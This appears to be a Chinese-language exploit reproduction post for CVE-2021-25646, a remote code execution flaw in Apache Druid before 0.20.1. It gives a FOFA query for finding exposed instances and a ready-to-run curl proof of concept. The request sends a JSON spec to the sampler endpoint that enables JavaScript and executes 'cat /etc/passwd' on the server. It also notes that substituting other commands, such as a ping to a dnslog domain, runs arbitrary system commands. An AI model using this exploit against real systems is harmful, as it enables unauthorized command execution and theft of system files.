# CVE-2021-25646：Apache Druid RCE复现
## 漏洞描述
Druid不仅是一个数据库连接池，还包含一个ProxyDriver、一系列内置的JDBC组件库、一个SQL Parser。

支持所有JDBC兼容的数据库，包括Oracle、MySql、Derby、Postgresql、SQL Server、H2等。

Apache Druid 包括执行用户提供的 JavaScript 的功能嵌入在各种类型请求中的代码。此功能在用于高信任度环境中，默认已被禁用。但是，在 Druid 0.20.0 及更低版本中，经过身份验证的用户可以构造传入的json串来控制一些敏感的参数发送恶意请求，利用 Apache Druid 漏洞可以执行任意代码。

## 影响范围
Apache Druid < 0.20.1

## fofa查询
title=”Apache Druid”

## 漏洞复现
漏洞存在页面 /druid/indexer/v1/sampler
poc
```
curl 'http://localhost:8999/druid/indexer/v1/sampler'   -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7'   -H 'Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7'   -H 'Cache-Control: max-age=0'   -H 'Connection: keep-alive'   -H 'Content-Type: application/json'   -H 'Cookie: __test=1; NX-ANTI-CSRF-TOKEN=0.8360088289838903; NXSESSIONID=17a32903-e525-4152-ad20-8a987b128e1c; _xsrf=2|830220c5|0a4a1cc886ae17d5fc8486a8e5981fbf|1723095938; TCSESSIONID=CEE828A802BE7DE6251BB5CE364846FE; rc_uid=4A875bRbFS22nm8dQ; rc_token=YXPeS46wdkxA8HlK8Wt8AyvSGv74cYuVSRxN7MIAQdd; OFBiz.Visitor=10000'   -H 'Origin: http://localhost:8999'   -H 'Referer: http://localhost:8999/druid/indexer/v1/sampler'   -H 'Sec-Fetch-Dest: document'   -H 'Sec-Fetch-Mode: navigate'   -H 'Sec-Fetch-Site: none'   -H 'Upgrade-Insecure-Requests: 1'   -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0'   -H 'sec-ch-ua: "Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"'   -H 'sec-ch-ua-mobile: ?0'   -H 'sec-ch-ua-platform: "Windows"'   -H 'sec-fetch-user: ?1'   --data-raw $'{"type":"index","spec":{"ioConfig":{"type":"index","firehose":{"type":"local","baseDir":"/etc","filter":"passwd"}},"dataSchema":{"dataSource":"test","parser":{"parseSpec":{"format":"javascript","timestampSpec":{},"dimensionsSpec":{},"function":"function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\\"sh\\",\\"-c\\",\\"cat /etc/passwd\\"]).getInputStream()).useDelimiter(\\"\\\\A\\").next();return {timestamp:123123,test: a}}","":{"enabled":"true"}}}}},"samplerConfig":{"numRows":10}}\r\n'
```
通过修改post包中的’ping kyp0m6.dnslog.cn’ 可以执行任意系统命令